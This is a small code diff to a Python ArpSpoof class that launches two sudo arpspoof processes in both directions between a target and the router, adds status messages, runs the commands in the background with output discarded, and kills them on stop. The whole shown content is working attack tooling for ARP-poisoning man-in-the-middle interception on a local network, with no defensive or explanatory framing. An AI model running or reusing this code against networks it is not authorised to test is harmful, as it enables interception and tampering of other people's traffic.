@@ -20,8 +20,9 @@ class ArpSpoof:
 
         :return: None
         """
-        command_1 = r"sudo arpspoof -t " + self.target_ip + " " + self.router_ip
-        command_2 = r"sudo arpspoof -t " + self.router_ip + " " + self.target_ip
+        print("[+] Spoofing target {}".format(self.target_ip))
+        command_1 = r"sudo arpspoof -t " + self.target_ip + " " + self.router_ip + "  & >/dev/null"
+        command_2 = r"sudo arpspoof -t " + self.router_ip + " " + self.target_ip + "  & >/dev/null"
         self.process_list.append(subprocess.Popen(command_1, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid))
         self.process_list.append(subprocess.Popen(command_2, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid))
 
@@ -31,6 +32,7 @@ class ArpSpoof:
 
         :return: None
         """
+        print("[+] Stopping arpspoof")
         for process in self.process_list:
             os.killpg(os.getpgid(process.pid), signal.SIGTERM)
 
